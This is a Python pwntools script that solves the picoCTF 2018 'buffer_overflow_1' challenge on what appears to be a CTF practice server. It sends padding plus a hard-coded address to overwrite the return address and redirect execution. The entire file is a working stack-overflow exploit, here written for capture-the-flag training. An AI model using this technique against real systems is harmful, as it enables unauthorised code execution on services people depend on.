from pwn import *
from LibcSearcher import LibcSearcher

#context(os='linux', arch='amd64', log_level='debug')
#
context(os='linux', arch='i386', log_level='debug')
#io = process('./picoCTF_2018_buffer_overflow_1')
#
io = connect('node5.buuoj.cn',26817)
elf=ELF('./picoCTF_2018_buffer_overflow_1')
#gdb.attach(io)

def rl():
	io.recvline()
def ru(s):
	io.recvuntil(s)
def sl(s):
	io.sendline(s)
def sd(s):
	io.send(s)

def plt(s):
	return elf.plt[s]
def got(s):
	return elf.got[s]

ru('string: \n')
sa=0x080485CB
pl=b'b'*(0x28+4)
pl+=p32(sa)
sl(pl)

#
io.interactive()
